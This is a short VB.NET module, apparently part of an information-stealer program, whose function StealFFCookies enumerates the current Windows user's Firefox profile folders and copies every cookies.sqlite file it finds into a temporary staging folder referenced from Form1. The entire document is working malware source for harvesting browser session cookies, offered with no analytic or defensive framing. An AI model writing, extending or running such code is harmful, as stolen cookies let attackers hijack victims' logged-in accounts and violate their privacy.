Imports System.IO
Module FirefoxCookies
    Public Function StealFFCookies()
        Try
            Dim directories As String() = Directory.GetDirectories("C:\Users\" + Environment.UserName + "\AppData\Roaming\Mozilla\Firefox\Profiles")
            Dim i As Integer = 0
            While i < directories.Length
                Dim text2 As String = directories(i)
                Dim flag As Boolean = File.Exists("C:\Users\" + Environment.UserName + "\AppData\Roaming\Mozilla\Firefox\Profiles" + text2.Replace("C:\Users\" + Environment.UserName + "\AppData\Roaming\Mozilla\Firefox\Profiles", String.Empty) + "\cookies.sqlite")
                If flag Then
                    Dim name As String = text2.Replace("C:\Users\" + Environment.UserName + "\AppData\Roaming\Mozilla\Firefox\Profiles", String.Empty)
                    File.Copy("C:\Users\" + Environment.UserName + "\AppData\Roaming\Mozilla\Firefox\Profiles\" + name + "\cookies.sqlite", Form1.TempPath & "\" & "cookies.sqlite", True)
                End If
                i = i + 1
            End While
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function
End Module
